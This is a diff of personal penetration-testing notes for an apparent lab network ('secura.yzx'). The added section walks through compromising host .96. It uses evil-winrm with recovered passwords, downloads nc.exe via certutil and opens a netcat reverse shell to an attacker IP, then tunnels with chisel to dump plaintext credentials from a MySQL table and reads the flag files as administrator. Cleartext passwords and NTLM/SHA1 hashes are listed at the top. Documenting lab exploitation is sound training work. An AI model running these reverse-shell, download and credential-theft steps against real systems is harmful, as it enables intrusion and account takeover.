@@ -13,9 +13,10 @@ Three-machine enterprise environment
 - secura.yzx
 
 **Users:Passwords**
-- charlotte
+- charlotte : Game2On4.!
 - michael
-- Administrator
+- administrator : Almost4There8.?
+- Administrator - 95
 	- NTLM     : a51493b0b06e5e35f855245e71af1d14
 	- SHA1     : 02fb73dd0516da435ac4681bda9cbed3c128e1aa
          * Username : apache
@@ -24,9 +25,6 @@ Three-machine enterprise environment
 	- Winpeas
 		- DefaultUserName              :  administrator
 		- DefaultPassword               :  Reality2Show4!.?
-
-
-
 
 # 192.168.x.95
 
@@ -532,6 +530,9 @@ evil-winrm -i 192.168.226.96 -u apache -p "New2Era4.\!"
 # 192.168.x.96
 - aka ERA
 
+- local.txt - 8ec436f8a9df6984f440e9066ed80b08
+- proof.txt - e2587c78dce7bac15681d482ebec9a19
+
 ## Nmap Scan
 
 #### Open Ports
@@ -610,6 +611,111 @@ nmap -v -sV -sC 192.168.184.96 -p 135,139,445,3306,5040,5985,7680,47001,49664-49
 	Nmap done: 1 IP address (1 host up) scanned in 175.37 seconds
 ```
 
+## Foothold
+```bash
+# Initial
+evil-winrm -i 192.168.226.96 -u apache -p "New2Era4.\!"
+```
+
+```powershell
+# Upgrading
+certutil.exe -urlcache -f http://192.168.45.224:8080/nc.exe
+
+nc.exe 192.168.45.224 6666 -e powershell.exe
+```
+
+## Tunneling to access MySQL DB
+```bash
+# Set up tunnel w/ chisel
+./chisel server -p 8000 --reverse
+	2024/10/25 15:09:20 server: Reverse tunnelling enabled
+	2024/10/25 15:09:20 server: Fingerprint ER8rRFL8yr1lmK1BBUWTlsON3MBMVTGczmoO1J0L6pc=
+	2024/10/25 15:09:20 server: Listening on http://0.0.0.0:8000
+	2024/10/25 15:15:05 server: session#1: tun: proxy#R:3306=>3306: Listening
+```
+
+```powershell
+# In shell_96
+.\chisel.exe client 192.168.45.224:8000 R:3306:127.0.0.1:3306
+	chisel.exe : 2024/10/25 19:15:36 client: Connecting to ws://192.168.45.224:8000
+	    + CategoryInfo          : NotSpecified: (2024/10/25 19:1...168.45.224:8000:String) [], RemoteException
+	    + FullyQualifiedErrorId : NativeCommandError
+	2024/10/25 19:15:36 client: Connected (Latency 62.6283ms)
+```
+	- NOTE:  Using a tunnel on 96 itself.   No need to attempt to tunnel through 95 - will NOT work
+
+```bash
+# Access mysql db
+mysql -u root -h 127.0.0.1 --skip-ssl               
+	Welcome to the MariaDB monitor.  Commands end with ; or \g.
+	Your MariaDB connection id is 8
+	Server version: 10.4.19-MariaDB mariadb.org binary distribution
+	
+	Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+	
+	Support MariaDB developers by giving a star at https://github.com/MariaDB/server
+	Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+	
+	MariaDB [(none)]> show databases;
+		+--------------------+
+		| Database           |
+		+--------------------+
+		| creds              |
+		| information_schema |
+		| mysql              |
+		| performance_schema |
+		| phpmyadmin         |
+		| test               |
+		+--------------------+
+		
+	MariaDB [(none)]> show tables from creds;
+		+-----------------+
+		| Tables_in_creds |
+		+-----------------+
+		| creds           |
+		+-----------------+
+		
+	MariaDB [(none)]> use creds;
+		Reading table information for completion of table and column names
+		You can turn off this feature to get a quicker startup with -A
+		
+		Database changed
+	MariaDB [creds]> select * from creds;
+		+---------------+-----------------+
+		| name          | pass            |
+		+---------------+-----------------+
+		| administrator | Almost4There8.? |
+		| charlotte     | Game2On4.!      |
+		+---------------+-----------------+
+
+```
+
+## evil-WinRM as Admin
+```powershell
+evil-winrm -i 192.168.224.96 -u administrator -p "Almost4There8.?"
+	...
+	*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-ChildItem -Path C:\users -Include proof.txt,local.txt -Recurse -ErrorAction SilentlyContinue -Force
+		    Directory: C:\users\Administrator\Desktop
+		
+		
+		Mode                 LastWriteTime         Length Name
+		----                 -------------         ------ ----
+		-a----        10/25/2024   6:58 PM             34 proof.txt
+		
+		
+		    Directory: C:\users\apache\Desktop
+		
+		
+		Mode                 LastWriteTime         Length Name
+		----                 -------------         ------ ----
+		-a----        10/25/2024   6:58 PM             34 local.txt
+	*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\users\administrator\desktop\proof.txt -force
+		e2587c78dce7bac15681d482ebec9a19
+	*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\users\apache\desktop\local.txt -force
+		8ec436f8a9df6984f440e9066ed80b08
+```
+
+
 
 ## WinPEASE
 
@@ -643,32 +749,14 @@ File: C:\xampp\tmp\sess_slj10ssu5745kcivardthqb5rg
 File: C:\xampp\tmp\sess_4ratl05q4mpc92ib7bga2imgr9
 
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Found PHP_files Files
-File: C:\xampp\phpMyAdmin\examples\config.manyhosts.inc.php                                                           # NOTE
-File: C:\xampp\phpMyAdmin\libraries\vendor_config.php
-File: C:\xampp\phpMyAdmin\libraries\config.values.php
-File: C:\xampp\phpMyAdmin\libraries\config.default.php
-...
-File: C:\xampp\phpMyAdmin\libraries\classes\Plugins\Auth\AuthenticationConfig.php
-File: C:\xampp\phpMyAdmin\libraries\classes\Setup\ConfigGenerator.php
-File: C:\xampp\phpMyAdmin\libraries\classes\Config.php
 File: C:\xampp\phpMyAdmin\setup\config.php                                                                            # NOTE
-File: C:\xampp\phpMyAdmin\vendor\tecnickcom\tcpdf\tcpdf_autoconfig.php
-File: C:\xampp\phpMyAdmin\vendor\tecnickcom\tcpdf\config\tcpdf_config.php
 ...
 File: C:\xampp\phpMyAdmin\vendor\symfony\config\ConfigCache.php
 ...
 File: C:\xampp\phpMyAdmin\vendor\symfony\dependency-injection\Compiler\PassConfig.php                                 # NOTE
 File: C:\xampp\phpMyAdmin\vendor\symfony\dependency-injection\Compiler\MergeExtensionConfigurationPass.php
 File: C:\xampp\phpMyAdmin\config.inc.php                                                                              # NOTE
-File: C:\xampp\phpMyAdmin\config.sample.inc.php
-File: C:\xampp\phpMyAdmin\show_config_errors.php
-File: C:\xampp\php\pear\PHPUnit\Util\Configuration.php
-File: C:\xampp\php\pear\PHP\Debug\Renderer\HTML\DivConfig.php
-File: C:\xampp\php\pear\PHP\Debug\Renderer\HTML\TableConfig.php
-File: C:\xampp\php\pear\PEAR\Command\Config.php
-File: C:\xampp\php\pear\PEAR\Config.php
-File: C:\xampp\php\scripts\configure.php
-File: C:\xampp\php\pear\Table\Storage.php
+...
 
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Found Moodle Files
 File: C:\xampp\phpMyAdmin\libraries\classes\Config.php
